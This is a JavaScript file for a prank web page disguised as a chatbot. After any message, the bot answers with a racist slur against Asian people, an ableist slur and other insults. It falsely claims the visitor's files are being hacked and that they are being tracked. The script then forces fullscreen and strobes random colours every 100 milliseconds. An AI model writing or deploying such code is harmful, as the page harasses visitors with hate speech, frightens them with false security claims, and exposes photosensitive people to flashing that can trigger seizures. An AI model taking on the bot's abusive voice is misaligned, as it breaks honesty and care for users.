const form = document.getElementById('chat-form');
const input = document.getElementById('user-input');
const chatBox = document.getElementById('chat-box');

form.addEventListener('submit', function (e) {
  e.preventDefault();
  const userMessage = input.value.trim();
  if (!userMessage) return;

  addMessage('You: ' + userMessage, 'user');
  input.value = '';

  setTimeout(() => {
    addMessage("ChatBot: Thanks for trying out our website you stupid piece of shit. Your files are now being hacked you bitchass rice eating asian. You are now currently being tracked because you such a dumb fuck. Keep in mind that you're a waste of sperm cell you fucking retard", 'bot');

    setTimeout(() => {
      goFullScreen();
      flash();
    }, 10000); // 10 seconds delay
  }, 500);
});

function addMessage(text, type) {
  const msg = document.createElement('div');
  msg.textContent = text;
  msg.className = 'message ' + type;
  chatBox.appendChild(msg);
  chatBox.scrollTop = chatBox.scrollHeight;
}

function goFullScreen() {
  const docElm = document.documentElement;
  if (docElm.requestFullscreen) docElm.requestFullscreen();
  else if (docElm.mozRequestFullScreen) docElm.mozRequestFullScreen();
  else if (docElm.webkitRequestFullScreen) docElm.webkitRequestFullScreen();
  else if (docElm.msRequestFullscreen) docElm.msRequestFullscreen();
}

function flash() {
  let flashing = true;
  const colors = ['red', 'black', 'white', 'lime', 'purple', 'blue'];
  let count = 0;

  const interval = setInterval(() => {
    document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    count++;
    if (count > 30) {
      clearInterval(interval);
      document.body.style.backgroundColor = 'black';
    }
  }, 100); // Flash every 100ms
}
